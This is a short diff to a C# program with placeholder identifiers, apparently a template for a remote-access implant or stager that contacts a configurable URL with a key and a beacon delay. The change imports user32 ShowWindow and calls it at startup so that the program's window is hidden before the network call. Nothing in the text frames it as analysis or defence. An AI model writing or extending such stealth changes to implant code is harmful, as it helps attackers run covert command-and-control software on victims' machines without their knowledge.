@@ -10,7 +10,10 @@ using System.Diagnostics;
 using System.IO;
 using System.Security.Cryptography.X509Certificates;
 using System.Web.Script.Serialization;
+using System.Runtime.InteropServices;
+
 namespace VAR1 {
+
  public class VAR2 {
   public string UUID {
    get;
@@ -31,6 +34,9 @@ namespace VAR1 {
   }
  }
  public class VAR6 {
+  [DllImport("user32.dll")]
+  static extern bool ShowWindow(IntPtr VAR102, UInt32 VAR101);
+
   protected static string VAR7;
   protected static string VAR8;
   protected static byte[] VAR9;
@@ -39,6 +45,7 @@ namespace VAR1 {
   protected static int VAR12;
   
   public static void Main() {
+	ShowWindow(IntPtr.Zero, 0); 
 	VAR13("[URL]", "[KEY]", "[DELAY]");
   }
   
